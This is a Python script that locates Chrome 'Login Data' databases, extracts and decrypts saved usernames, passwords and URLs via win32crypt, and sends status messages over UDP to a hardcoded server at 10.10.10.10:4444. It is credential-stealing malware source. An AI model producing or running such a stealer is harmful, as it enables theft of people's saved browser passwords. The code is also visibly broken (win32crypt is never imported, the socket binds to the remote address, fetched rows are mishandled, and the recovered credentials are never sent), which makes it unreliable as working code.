import os
import sqlite3
from socket import socket, AF_INET, SOCK_DGRAM


USERPROFILE = os.getenv('USERPROFILE')
CHROME_PATH = "\\Local Settings\\Application Data\\Google\\Chrome"
SERVER_ADDR = "10.10.10.10"
SERVER_PORT = 4444


def sendMessage(message) -> None:
    sock = socket(AF_INET, SOCK_DGRAM, 136)
    sock.bind((SERVER_ADDR, SERVER_PORT))

    sock.sendto(message.encode('UTF-8'), (SERVER_ADDR, SERVER_PORT))
    sock.setsockopt(136, 10, 16)

    sock.close()


def decryptFetchedData(fetched_data) -> object:
    return win32crypt.CryptUnprotectData(fetched_data[2], None, None, None, 0)[1]


def extractCookies(file) -> None:
    num = 0

    try:
        connection = sqlite3.connect(file)
        cursor = connection.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        results = cursor.fetchone()

        for result in results:
            password = decryptFetchedData(result)

            if not password: continue

            num += 1
            output = result[1]

            if not output == "": output += ":"
            if not password == "": output += password + ":"
            if not result[0] == "": output += result[0]


        if num > 0: sendMessage(f'[+] Finished recovering Chrome logins.')

        sendMessage(f'Error: No logins in Chrome installation.')
    except sqlite3.Error as e:
            sendMessage(f'Error: {e.with_traceback}')


def searchChromeFiles() -> None:
    founded_files = []

    if not os.path.isdir(USERPROFILE + CHROME_PATH + "\\User Data"):
        sendMessage('Chrome not found. Unable to recover logins.')
        return

    for file in os.listdir(USERPROFILE + CHROME_PATH + "\\User Data"):
        if not os.path.isfile(USERPROFILE + CHROME_PATH + "\\User Data\\" + file + "\\Login Data"):
            continue

        founded_files.append(USERPROFILE + CHROME_PATH + "\\User Data\\" + file + "\\Login Data")


    if founded_files.__len__() == 0:
        sendMessage('Chrome not found. Unable to recover logins.')
        return

    sendMessage('Chrome found. Recovering logins for all users in format USER:PASSWORD:URL.')
    [extractCookies(file) for file in founded_files]


if __name__ == '__main__':
    searchChromeFiles()